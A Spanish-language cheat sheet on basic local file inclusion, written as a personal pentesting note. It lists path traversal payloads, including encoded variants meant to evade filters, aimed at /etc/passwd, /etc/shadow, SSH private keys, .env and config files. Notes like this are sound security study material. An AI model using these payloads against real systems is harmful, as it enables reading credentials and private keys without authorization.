---
aliases: null
tags:
  - type/technique
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[File Inclusion]]'
---
# LFI - Básico

***

## Cheatsheet

|                    **Técnica**                     |                                 **Descripción**                                 |                            **Payload**                             |
|:--------------------------------------------------:|:-------------------------------------------------------------------------------:|:------------------------------------------------------------------:|
|              <br>**Traversal básico**              |             <br>Subir directorios con `../` hasta llegar a la raíz              |                <br>`../../../../etc/passwd`<br><br>                |
|             <br>**Traversal absoluto**             |           <br>Usar ruta completa si no hay restricción de directorio            |                     <br>`/etc/passwd`<br><br>                      |
| <br>**Traversal con profundidad excesiva**<br><br> |        <br>Meter más `../` de los necesarios; el sistema se frena en `/`        |           <br>`../../../../../../../etc/passwd`<br><br>            |
|             <br>**Dot encoding (URL)**             |          <br>Encodear los puntos y barras para evadir filtros básicos           |             <br>`%2e%2e%2f%2e%2e%2fetc/passwd`<br><br>             |
|            <br>**Double URL encoding**             |        <br>Doble encoding para evadir filtros que decodean una sola vez         |                   <br>`%252e%252e%252f`<br><br>                    |
|           <br>**Archivos comunes Linux**           |                  <br>Apuntar a archivos conocidos del sistema                   |   <br>`/etc/shadow`, `/etc/hosts`, `/proc/self/cmdline`<br><br>    |
|          <br>**Archivos comunes Windows**          |                           <br>Equivalentes en Windows                           | <br>`C:\Windows\System32\drivers\etc\hosts`, `C:\boot.ini`<br><br> |
|          <br>**Lectura de código fuente**          | <br>Leer archivos de la propia app para descubrir lógica o credenciales<br><br> |         <br>`../../../../var/www/html/config.php`<br><br>          |
|           <br>**Lectura de claves SSH**            |              <br>Acceder a claves privadas de usuarios del sistema              |          <br>`../../../../home/user/.ssh/id_rsa`<br><br>           |
|       <br>**Lectura de archivos de entorno**       |            <br>Buscar credenciales en variables de entorno o `.env`             |            <br>`../../../../var/www/html/.env`<br><br>             |
^lfi-basico

***

## Overview

LFI ocurre cuando una aplicación incluye archivos del servidor usando input del usuario sin sanitizar. El atacante manipula el parámetro (generalmente en la URL) para leer archivos sensibles del sistema mediante directory traversal (`../`). Es la forma más básica de file inclusion y suele ser el punto de partida para escalar a técnicas más complejas como log poisoning o RCE.


***
